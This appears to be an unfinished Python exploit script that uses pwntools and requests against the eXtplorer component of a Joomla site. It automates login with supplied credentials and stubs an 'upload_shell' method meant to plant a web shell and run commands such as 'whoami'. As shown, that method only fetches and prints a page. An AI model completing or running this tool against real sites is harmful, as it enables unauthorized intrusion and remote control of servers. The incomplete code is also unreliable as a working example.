#!/usr/bin/python3

from pwn import *
from sys import exit
import requests
import re

class ExploitExtplorer:

    def __init__(self,url,username,password,command="whoami"):
        self.url = url
        self.username = username
        self.password = password
        self.session = None
        self.command = command
        self.p = log.progress("")

            
    def login_joomla(self):

        self.session = session = requests.Session()
        response = session.get(self.url)
        cookies = response.cookies.get_dict()
        data = {
                'username':self.username,
                'passwd':self.password,
                'option':'com_login',
                'task':'login'
                }
        for inputs in (response.text).split('\n'):
            if 'name="return"' in inputs:
                data['return'] = (inputs.split('value="')[1].split('"')[0])
            elif 'value="1"' in inputs:
                data[(inputs.split('name="')[1].split('"')[0])] = '1'
        
        login = session.post(self.url,data=data,cookies=cookies)
        if "Edit Account" in login.text:
            self.p.status("Login Successful!")
        else:
            self.p.status("Login Failed!")
            exit()

    def upload_shell(self):
        
        session = self.session
        response = session.get(self.url + 'index.php?option=com_extplorer&tmpl=component')
        print(response.text.split('\n'))

            

if __name__ == "__main__":

    if len(sys.argv) != 4:
        # Add function that handles arguments here
        error(f"Usage: {sys.argv[0]} url username password")

    if len(sys.argv) == 4:
        exploit = ExploitExtplorer(sys.argv[1],sys.argv[2],sys.argv[3])

    exploit.login_joomla()
    exploit.upload_shell()

